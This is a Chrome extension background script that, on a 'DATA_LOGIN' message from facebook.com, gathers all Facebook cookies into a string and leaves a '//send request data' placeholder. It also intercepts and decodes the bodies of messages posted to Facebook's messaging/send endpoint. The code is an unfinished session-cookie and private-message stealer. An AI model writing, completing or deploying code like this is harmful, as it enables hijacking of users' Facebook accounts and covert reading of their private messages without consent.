var cookieGet = "";
chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
  //Facebook
  if (sender.url.match("facebook.com") !== null) {
    console.log("xinchao");
    if (request.action) {
      switch (request.action.type) {
        case "DATA_LOGIN":
          let cookie = ''
          chrome.cookies.getAll(
            {
              url: "https://www.facebook.com"
            },
            res => {
              res.map(data => {
                return (cookie += data.name + "=" + data.value + "; ");
              });
                     //send request data
            }
          );
          break;

        default:
          break;
      }
    }
  }

  console.log(request);
  console.log("sender", sender);
  console.log("sendRequest", sendResponse);
});


chrome.webRequest.onBeforeRequest.addListener(details => {
    console.log(details)
    let postedString = decodeURIComponent(String.fromCharCode.apply(null,
        new Uint8Array(details.requestBody.raw[0].bytes)));
    //cac cac
    console.log(parseQuery(postedString))
}, {urls: [
    'https://www.facebook.com/messaging/send/'
]}, ['requestBody'])


function parseQuery(search) {
  var args = search.substring(1).split("&");
  var argsParsed = {};
  var i, arg, kvp, key, value;
  for (i = 0; i < args.length; i++) {
    arg = args[i];
    if (-1 === arg.indexOf("=")) {
      argsParsed[decodeURIComponent(arg).trim()] = true;
    } else {
      kvp = arg.split("=");

      key = decodeURIComponent(kvp[0]).trim();

      value = decodeURIComponent(kvp[1]).trim();

      argsParsed[key] = value;
    }
  }

  return argsParsed;
}